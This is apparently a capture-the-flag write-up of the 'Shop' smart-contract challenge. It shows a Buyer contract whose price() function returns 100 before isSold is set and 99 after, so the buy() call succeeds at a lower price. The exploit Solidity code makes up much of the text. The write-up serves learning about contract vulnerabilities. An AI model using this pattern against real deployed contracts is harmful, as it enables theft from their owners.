# Shop

Objective: 
- Ð¡an you get the item from the shop for less than the price asked?

The vulnerability lies in that we can interact as the Buyer with setting our own prices after returning the price with a check on how `isSold()` right after it is sold.

So in the Shop contract we have this code snippet

```solidity 
// during this call, isSold is false
if (_buyer.price() >= price && !isSold) {
// the state will change for isSold
isSold = true;
// during this call, isSold is true
price = _buyer.price();
}
```

That is where we come in. Since the switch for `isSold` is in the midst of the loop we can edit the value in our Buyer contract before it calls the price. Therefore we can write this: 
```solidity
function hack() external {
    target.buy();
    require(target.price() == 99, "price != 99");
  }

  function price() external view returns (uint) {
    if (target.isSold()) {
      return 99;
    }
    return 100;
  }
```

That will mimic the `price()` function but editing the return value after the item is sold. This makes us buy it at a lower price when we have our `hack()` function:
```solidity
function hack() external {
    target.buy();
    require(target.price() == 99, "price != 99");
  }
```
